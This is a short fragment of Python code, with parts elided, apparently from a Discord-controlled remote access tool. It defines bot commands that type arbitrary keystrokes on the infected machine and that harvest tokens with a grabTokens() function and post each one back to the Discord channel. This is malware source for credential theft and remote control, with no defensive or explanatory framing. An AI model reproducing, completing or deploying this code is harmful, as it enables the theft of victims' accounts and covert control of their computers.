import requests, os, json, base64, getpass, ctypes, win32process, pyautogui, discord, keyboard, subprocess
...
async def type(ctx):
    ...
    _, text = ctx.message.content.split(' ')

    keyboard.write(text)

    await ctx.reply(f"typed: {text}")


@client.command()
async def tokens(ctx):
    await ctx.reply("getting tokens...")

    for tok in grabTokens():
        await ctx.reply(tok)
